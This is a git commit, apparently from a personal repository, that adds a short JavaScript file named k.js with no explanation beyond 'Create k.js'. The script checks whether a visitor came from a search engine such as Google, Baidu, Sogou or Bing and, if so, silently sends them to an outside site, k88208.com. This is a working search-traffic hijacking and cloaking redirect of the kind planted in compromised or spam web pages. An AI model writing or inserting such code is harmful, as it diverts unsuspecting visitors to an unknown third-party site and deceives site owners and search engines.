690ddef64d667678095201cd435bd12c8715de8e
maomapchong <zhangjiadaz@gmail.com>
2018-01-22 13:54:20 +0800

    Create k.js

---
+++ k.js
@@ -0,0 +1,3 @@
+var s=document.referrer 
+if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("so")>0  || s.indexOf("sogou")>0 || s.indexOf("sm")>0 || s.indexOf("soso")>0 || s.indexOf("bing")>0) 
+location.href="http://k88208.com/visitor_demo.htm"; 
